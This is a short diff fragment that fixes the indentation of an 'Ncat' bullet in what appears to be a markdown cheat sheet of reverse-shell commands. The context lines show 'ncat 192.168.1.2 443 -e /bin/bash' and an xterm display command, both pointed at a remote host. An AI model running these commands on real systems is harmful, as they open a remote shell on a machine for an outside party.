@@ -75,7 +75,7 @@
    xterm -display 192.168.1.2:443
    ```
    
-   * Ncat
+* Ncat
 
   ```bash
   ncat 192.168.1.2 443 -e /bin/bash
